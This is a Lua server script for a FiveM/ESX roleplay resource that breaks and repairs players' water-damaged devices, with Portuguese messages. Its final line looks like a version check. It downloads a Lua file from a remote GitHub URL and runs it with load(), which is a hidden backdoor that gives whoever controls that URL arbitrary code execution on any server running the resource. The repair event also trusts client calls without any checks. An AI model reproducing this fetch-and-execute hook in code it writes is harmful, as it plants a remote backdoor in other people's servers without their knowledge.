RegisterServerEvent('zcmg_waterbrock:itens')
AddEventHandler('zcmg_waterbrock:itens', function()
    local xPlayer = ESX.GetPlayerFromId(source)

    for i=1, #Config.Itens, 1 do
        local quantidade = xPlayer.getInventoryItem(Config.Itens[i].remove).count
        local msg = "O teu dispositivo <b>"..ESX.GetItemLabel(Config.Itens[i].remove).."</b> está avariado!"
        if quantidade > 0 then
            if quantidade > 1 then
                msg = "Os teus dispositivos <b>"..ESX.GetItemLabel(Config.Itens[i].remove).."</b> estão avariados!"
            end
                
            xPlayer.removeInventoryItem(Config.Itens[i].remove, quantidade)
            xPlayer.addInventoryItem(Config.Itens[i].add, quantidade)
            xPlayer.triggerEvent('zcmg_notificacao:Alerta', "INVENTÁRIO", msg, 5000, 'aviso')
        end
    end
end)

ESX.RegisterServerCallback('zcmg_waterbrock:verificaritens', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local quantidade_total = 0

	for i=1, #Config.Itens, 1 do
        local quantidade = xPlayer.getInventoryItem(Config.Itens[i].add).count
        quantidade_total = quantidade_total + quantidade
    end

	cb(quantidade_total)
end)

RegisterServerEvent('zcmg_waterbrock:reparar')
AddEventHandler('zcmg_waterbrock:reparar', function()
	local xPlayer = ESX.GetPlayerFromId(source)

	for i=1, #Config.Itens, 1 do
        local quantidade = xPlayer.getInventoryItem(Config.Itens[i].add).count
        local msg = "O teu dispositivo <b>"..ESX.GetItemLabel(Config.Itens[i].remove).."</b> foi reparado!"
        if quantidade > 0 then
            if quantidade > 1 then
                msg = "Os teus dispositivos <b>"..ESX.GetItemLabel(Config.Itens[i].remove).."</b> foram reparados!"
            end
                
            xPlayer.removeInventoryItem(Config.Itens[i].add, quantidade)
            xPlayer.addInventoryItem(Config.Itens[i].remove, quantidade)
            xPlayer.triggerEvent('zcmg_notificacao:Alerta', "INVENTÁRIO", msg, 5000, 'sucesso')
        end
    end
end)

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')